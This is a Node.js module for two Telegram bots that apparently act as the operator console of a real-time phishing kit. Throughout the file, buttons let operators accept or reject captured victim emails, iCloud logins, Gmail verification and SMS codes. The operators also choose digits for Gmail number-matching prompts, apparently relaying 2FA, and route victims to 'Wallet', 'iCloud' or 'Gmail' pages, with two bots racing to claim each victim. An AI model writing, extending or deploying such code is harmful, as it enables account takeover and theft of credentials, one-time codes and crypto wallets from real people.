const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

const BOT_TOKEN_2 = process.env.BOT_TOKEN_2;
const ADMIN_CHAT_ID_2 = process.env.ADMIN_CHAT_ID_2;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// ============================================================================
// ✅ BOT 1 SETUP
// ============================================================================

const bot = new TelegramBot(BOT_TOKEN, {
  polling: { autoStart: true, params: { timeout: 10 } }
});

bot.getMe().then(() => {
  console.log("✅ Bot 1 connected successfully.");
}).catch(err => {
  console.error("❌ Bot 1 connection failed:", err.message);
});

let botRestartAttempts = 0;
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
    botRestartAttempts++;
    if (botRestartAttempts <= 1) {
      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
      bot.stopPolling().then(() => {
        setTimeout(() => {
          bot.startPolling();
          console.log("✅ Bot 1: Polling restarted");
        }, 2000);
      });
    } else {
      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
    }
  } else {
    console.error("❌ Bot 1 polling error:", err.message);
  }
});

// ============================================================================
// ✅ BOT 2 SETUP (NEW)
// ============================================================================

let bot2 = null;
if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
  bot2 = new TelegramBot(BOT_TOKEN_2, {
    polling: {
      autoStart: true,
      params: { timeout: 10 }
    }
  });

  bot2.getMe().then(() => {
    console.log("✅ Bot 2 connected successfully.");
  }).catch(err => {
    console.error("❌ Bot 2 connection failed:", err.message);
  });

  let bot2RestartAttempts = 0;
  bot2.on("polling_error", (err) => {
    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
      bot2RestartAttempts++;
      if (bot2RestartAttempts <= 1) {
        console.warn("⚠️ Bot 2: 409 Conflict - stopping and restarting polling...");
        bot2.stopPolling().then(() => {
          setTimeout(() => {
            bot2.startPolling();
            console.log("✅ Bot 2: Polling restarted");
          }, 2000);
        });
      } else {
        console.error("❌ Bot 2: Multiple 409 errors - possible duplicate instance");
      }
    } else {
      console.error("❌ Bot 2 polling error:", err.message);
    }
  });
}

// ============================================================================
// ✅ GLOBAL STORAGE OBJECTS (EXPORTED TO server.js)
// ============================================================================

const userWinnerTelegram = {};
const botsThatClickedPage1 = {};
const notificationSent = {};
const handledCallbacks = new Set();

// ============================================================================
// ✅ BROADCAST MESSAGE (Send to both bots)
// ============================================================================

async function broadcastMessage(chatId, message, options = {}) {
  const errors = [];

  try {
    await bot.sendMessage(chatId, message, options);
    console.log(`✅ Message sent to Bot 1 (Chat: ${chatId})`);
  } catch (err) {
    console.error("❌ Failed to send to Bot 1:", err.message);
    errors.push(err);
  }

  if (bot2 && ADMIN_CHAT_ID_2) {
    try {
      await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
      console.log(`✅ Message sent to Bot 2 (Chat: ${ADMIN_CHAT_ID_2})`);
    } catch (err) {
      console.error("❌ Failed to send to Bot 2:", err.message);
      errors.push(err);
    }
  }

  if (errors.length === 2) {
    throw new Error("Failed to send to all bots");
  }
}

// ============================================================================
// ✅ SEND FOLLOW-UP MESSAGE (To winner only)
// ============================================================================

async function sendFollowUpMessage(email, message, options = {}) {
  try {
    console.log(`🔍 Checking winner for ${email}: ${userWinnerTelegram[email]}`);
    
    if (userWinnerTelegram[email] === "telegram1") {
      await bot.sendMessage(ADMIN_CHAT_ID, message, options);
      console.log(`📨 Follow-up sent to Bot 1 (Email: ${email})`);
    } else if (userWinnerTelegram[email] === "telegram2") {
      if (bot2 && ADMIN_CHAT_ID_2) {
        await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
        console.log(`📨 Follow-up sent to Bot 2 (Email: ${email})`);
      }
    } else {
      console.log(`⚠️ No winner found for ${email}, not sending follow-up`);
    }
  } catch (err) {
    console.error("❌ Failed to send follow-up message:", err.message);
  }
}

// ============================================================================
// ✅ BOT 1 CALLBACK QUERY HANDLER
// ============================================================================

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) return;
  handledCallbacks.add(callbackId);

  try {
    const [action, identifier] = query.data.split("|");

    console.log(`🔘 Bot 1 | ${identifier} | Action: ${action}`);

    // ============================================================================
    // ✅ VERIFY_DIGIT HANDLER (Gmail verification)
    // ============================================================================
    if (action === "verify_digit") {
      const [, requestId, digit] = query.data.split("|");
      console.log(`📍 Digit ${digit} clicked for requestId: ${requestId}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, digit })
        });
        
        const result = await updateResult.json();
        console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
        
        if (result.selectedCount === 2) {
          try {
            await bot.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
            
            await bot.sendMessage(
              query.message.chat.id,
              `✅ <b>Numbers Selected!</b>`,
              { parse_mode: "HTML" }
            );
          } catch (err) {
            console.error("❌ Error editing message:", err);
          }
        }

        await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
        return;
      } catch (err) {
        console.error("❌ verify_digit error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
        return;
      }
    }

    // ============================================================================
    // ✅ SMS2 BUTTONS HANDLER
    // ============================================================================
    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
      const sms2Id = identifier;
      console.log(`📲 SMS 2 choice: ${action} for sms2Id: ${sms2Id}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sms2Id, choice: action })
        });
        
        const result = await updateResult.json();
        console.log(`✅ SMS 2 choice updated: ${action}`);
        
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        try {
          const botToken = process.env.BOT_TOKEN;
          const chatId = process.env.ADMIN_CHAT_ID;
          
          const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
          const sms2Data = await sms2Info.json();
          const sms2Email = sms2Data.email || sms2Id;
          
          let statusMsg = "";
          if (action === "sms2_wallet") {
            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
          } else if (action === "sms2_done") {
            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
          } else if (action === "sms2_reject") {
            statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
          } else if (action === "sms2_icloud") {
            statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
          } else if (action === "sms2_gmail") {
            statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
          }
          
          if (statusMsg) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                text: statusMsg,
                parse_mode: "HTML"
              })
            });
            console.log(`✅ Sent status message: ${statusMsg}`);
          }
        } catch (err) {
          console.error("Error sending status message:", err);
        }
        
        return;
      } catch (err) {
        console.error("❌ SMS 2 choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ============================================================================
    // ✅ VERIFYING BUTTONS HANDLER
    // ============================================================================
    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
      const verifyingId = identifier;
      console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ verifyingId, choice: action })
        });
        
        const result = await updateResult.json();
        console.log(`✅ Verifying choice updated: ${action}`);
        
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        try {
          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
          const verifyData = await verifyRes.json();
          const verifyEmail = verifyData.email || 'unknown@example.com';
          
          let choiceText = '';
          if (action === "verifying_sms") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
          } else if (action === "verifying_done") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
          } else if (action === "verifying_wallet") {
            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
          } else if (action === "verifying_icloud") {
            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
          } else if (action === "verifying_gmail") {
            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
          }
          
          if (choiceText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: choiceText,
                parse_mode: "HTML"
              })
            });
            console.log(`✅ Sent verifying choice message`);
          }
        } catch (err) {
          console.error("Error sending choice message:", err);
        }
        
        return;
      } catch (err) {
        console.error("❌ Verifying choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ============================================================================
    // ✅ WALLET DECISION BUTTONS HANDLER
    // ============================================================================
    if (action.startsWith("wallet_decision_")) {
      const email = identifier;
      console.log(`💼 Wallet decision: ${action} for email: ${email}`);
      
      try {
        await fetch(`${APP_URL}/update-wallet-decision`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, choice: action })
        });

        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {}

        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        return;
      } catch (err) {
        console.error("❌ Wallet decision error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing decision" });
        return;
      }
    }

    // ============================================================================
    // ✅ MAIN CALLBACK HANDLER (Page 1 buttons + Page 2 buttons + SMS buttons)
    // ============================================================================
    
    let email = identifier;
    let smsCode = "";
    let displayEmail = email;  // ✅ What to show in acceptance message

    // ✅ For SMS callbacks, get SMS code from server
    if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
      try {
        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}`);
        const data = await response.json();
        smsCode = data.smsCode || identifier;
        console.log(`📝 SMS callback: requestId ${identifier} → code ${smsCode}`);
      } catch (err) {
        console.error("Error fetching SMS code:", err);
        smsCode = identifier;
      }
    }

    // ✅ For iCloud page callbacks, get displayEmail from server
    if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
      try {
        const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
        const data = await response.json();
        displayEmail = data.displayEmail || email;
        console.log(`📝 iCloud page callback: email ${identifier} → display ${displayEmail}`);
      } catch (err) {
        console.error("Error fetching display email:", err);
        displayEmail = email;
      }
    }

    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for SMS!)
    if (!userWinnerTelegram[email] && !action.startsWith("sms_")) {
      userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
      botsThatClickedPage1[email] = true;
      botsThatClickedPage1[`${email}_timestamp`] = Date.now();
      
      console.log(`🏆 User ${email} - Telegram 1 WINS!`);
      
      // Send notification to Bot 2 (loser)
      if (bot2 && ADMIN_CHAT_ID_2) {
        try {
          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`, { parse_mode: "HTML" });
        } catch (err) {
          console.error("Error sending loser notification:", err);
        }
      }
    }

    // ============================================================================
    // ✅ STEP 2: Handle button-specific logic
    // ============================================================================

    // Handle status update
    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, identifier: email, status: action })
    });

    // Handle redirection choices
    if (action.includes("redirect_")) {
      await fetch(`${APP_URL}/update-redirection-choice`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, choice: action })
      });
    }

    if (response.ok) {
      // Remove buttons from original message
      try {
        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
        await fetch(editUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: query.message?.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [] })
          })
        });
      } catch (err) {}

      // Build status message
      let statusMessage = "";
      console.log(`📋 Building status message for action: ${action}, email: ${email}`);
      
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "page_accept") {
        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page_reject") {
        statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
      } else if (action === "sms_accept") {
        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
      } else if (action === "sms_reject") {
        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
      } else if (action === "redirect_icloud") {
        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
      } else if (action === "redirect_gmail") {
        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
      } else if (action === "gmail_accept") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "gmail_reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
      } else if (action === "gmail_verify_accept") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
      } else if (action === "gmail_verify_reject") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
      } else if (action === "verifying_sms") {
        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
      } else if (action === "verifying_done") {
        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
      } else if (action === "verifying_wallet") {
        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
      } else if (action === "verifying_icloud") {
        statusMessage = `📧 <code>${email}</code> → ☁️`;
      } else if (action === "verifying_gmail") {
        statusMessage = `📧 <code>${email}</code> → 🌈`;
      } else if (action === "sms2_wallet") {
        statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
      } else if (action === "sms2_done") {
        statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
      } else if (action === "sms2_reject") {
        statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
      } else if (action === "wallet_decision_sms") {
        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
      } else if (action === "wallet_decision_done") {
        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
      } else if (action === "wallet_decision_icloud") {
        statusMessage = `📧 <code>${email}</code> → ☁️`;
      } else if (action === "wallet_decision_gmail") {
        statusMessage = `📧 <code>${email}</code> → 🌈`;
      }

      console.log(`📨 Final statusMessage: "${statusMessage}"`);

      if (statusMessage) {
        try {
          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          console.log(`🚀 Sending message to Telegram...`);
          await fetch(replyUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: statusMessage,
              parse_mode: "HTML"
            })
          });
          console.log(`✅ Message sent successfully!`);
        } catch (err) {
          console.error(`❌ Failed to send status message:`, err);
        }
      }
    }

    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

// ============================================================================
// ✅ BOT 2 CALLBACK QUERY HANDLER (with loser polling logic)
// ============================================================================

if (bot2) {
  bot2.on("callback_query", async (query) => {
    const callbackId = query.id;
    
    if (handledCallbacks.has(callbackId)) return;
    handledCallbacks.add(callbackId);

    try {
      const [action, identifier] = query.data.split("|");

      console.log(`🔘 Bot 2 | ${identifier} | Action: ${action}`);

      const email = identifier;

      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet)
      if (!userWinnerTelegram[email]) {
        userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
        botsThatClickedPage1[email] = true;
        botsThatClickedPage1[`${email}_timestamp`] = Date.now();
        
        console.log(`🏆 User ${email} - Telegram 2 WINS!`);
        // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
      }

      // ============================================================================
      // ✅ STEP 2: LOSER BOT POLLING LOGIC (NEW - CRITICAL!)
      // ============================================================================
      
      if (userWinnerTelegram[email] === "telegram2" && (action === "page1" || action === "page2")) {
        // Bot 2 won, so we're looking at Bot 1's click
        // This means Bot 2 is actually the winner, and this is handled elsewhere
      }

      if (userWinnerTelegram[email] === "telegram1" && action === "page2") {
        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
        // Bot 2 clicked "📧 Email Redirection" (page2 button)
        // START POLLING for Page 2 data
        
        console.log(`📨 TRIGGER: Bot 2 (loser) clicked "Email Redirection" - starting poll`);
        
        const pollingInterval = setInterval(async () => {
          const page2Data = global.page2MessageDataStore ? global.page2MessageDataStore[email] : null;
          
          if (page2Data) {
            clearInterval(pollingInterval);
            console.log(`📨 TRIGGER: Page 2 data found!`);
            
            const elapsedTime = Date.now() - botsThatClickedPage1[`${email}_timestamp`];
            
            if (elapsedTime < 15000) {
              // ✅ Within 15-second window
              console.log(`✅ Page 2 found (${elapsedTime}ms) → sending after 2s delay`);
              
              setTimeout(async () => {
                try {
                  await bot2.sendMessage(ADMIN_CHAT_ID_2, page2Data.message, page2Data.options);
                  console.log(`📨 Page 2 sent to Bot 2 (loser)`);
                } catch (err) {
                  console.error("Error sending Page 2 to loser:", err);
                }
              }, 2000);
            } else {
              // ❌ After 15-second timeout
              console.log(`⏱️ TIMEOUT: Bot 2 waited ${elapsedTime}ms but exceeded 15s`);
              
              try {
                await bot2.sendMessage(ADMIN_CHAT_ID_2, 
                  `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
                  { parse_mode: "HTML" }
                );
              } catch (err) {
                console.error("Error sending acceptance message:", err);
              }
            }
          }
        }, 100);  // Check every 100ms
        
        // Stop polling after 15 seconds max
        setTimeout(() => {
          clearInterval(pollingInterval);
          console.log(`⏱️ TIMEOUT: Stopped polling (15 seconds exceeded)`);
        }, 15000);
        
        await bot2.answerCallbackQuery(query.id, { text: "✅ Waiting..." });
        return;
      }

      if (userWinnerTelegram[email] === "telegram1" && action === "page1") {
        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
        // Bot 2 clicked "💬 SMS" (page1 button)
        // SKIP Page 2, show acceptance immediately
        
        console.log(`🔑 Bot 2 (loser) clicked "SMS" button - NO Page 2`);
        
        try {
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID_2,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        try {
          await bot2.sendMessage(ADMIN_CHAT_ID_2, 
            `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.error("Error sending acceptance message:", err);
        }

        await bot2.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
        return;
      }

      // ============================================================================
      // ✅ STEP 3: Handle other buttons (same as Bot 1)
      // ============================================================================

      const response = await fetch(`${APP_URL}/update-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, identifier: email, status: action })
      });

      if (action.includes("redirect_")) {
        await fetch(`${APP_URL}/update-redirection-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, choice: action })
        });
      }

      if (response.ok) {
        try {
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID_2,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        let statusMessage = "";
        
        if (action === "page1") {
          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "page2") {
          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "reject") {
          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
        } else if (action === "page_accept") {
          statusMessage = `☁️ <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "page_reject") {
          statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
        } else if (action === "sms_accept") {
          statusMessage = `💬 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
        } else if (action === "sms_reject") {
          statusMessage = `💬 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
        } else if (action === "redirect_icloud") {
          statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
        } else if (action === "redirect_gmail") {
          statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
        } else if (action === "gmail_accept") {
          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "gmail_reject") {
          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
        } else if (action === "gmail_verify_accept") {
          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
        } else if (action === "gmail_verify_reject") {
          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
        } else if (action === "verifying_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "verifying_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "verifying_wallet") {
          statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
        } else if (action === "verifying_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "verifying_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        } else if (action === "sms2_wallet") {
          statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
        } else if (action === "sms2_done") {
          statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
        } else if (action === "sms2_reject") {
          statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
        } else if (action === "wallet_decision_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "wallet_decision_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "wallet_decision_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "wallet_decision_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        }

        if (statusMessage) {
          try {
            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
            await fetch(replyUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID_2,
                text: statusMessage,
                parse_mode: "HTML"
              })
            });
          } catch (err) {
            console.error(`❌ Failed to send status message:`, err);
          }
        }
      }

      bot2.answerCallbackQuery(callbackId, {
        text: `✅ ${action.toUpperCase()}`,
        show_alert: false
      }).catch(() => {});

    } catch (err) {
      console.error("❌ Error (Bot 2):", err.message);
      bot2.answerCallbackQuery(query.id, {
        text: "❌ Error",
        show_alert: true
      }).catch(() => {});
    }
  });
}

console.log(`✅ Bots ready`);

// ============================================================================
// ✅ EXPORT
// ============================================================================

module.exports = { 
  bot, 
  bot2,
  broadcastMessage,
  sendFollowUpMessage,
  userWinnerTelegram,
  botsThatClickedPage1
};
